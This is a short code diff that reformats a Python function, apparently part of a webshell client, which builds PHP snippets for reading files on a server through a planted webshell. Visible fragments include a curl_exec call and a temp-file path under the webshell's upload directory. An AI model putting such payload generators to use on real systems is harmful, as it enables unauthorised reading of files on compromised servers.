@@ -1,7 +1,8 @@
 from libs.config import gget
-from libs.myapp import base64_encode,uuid4
+from libs.myapp import base64_encode, uuid4
 
-def get_php_cat(file_path,read_method):
+
+def get_php_cat(file_path, read_method):
 
     php_code = ""
     if read_method == 1:
@@ -25,7 +26,9 @@ def get_php_cat(file_path,read_method):
         @curl_exec($c);
         @curl_close($c);"""
     if read_method == 7:
-        tmp_file = gget("webshell.upload_tmp_dir",  namespace="webshell")+uuid4()
+        tmp_file = gget(
+            "webshell.upload_tmp_dir",
+            namespace="webshell") + uuid4()
         php_code = f"""
         $f=base64_decode('{base64_encode(file_path)}');
         $p="{tmp_file}";
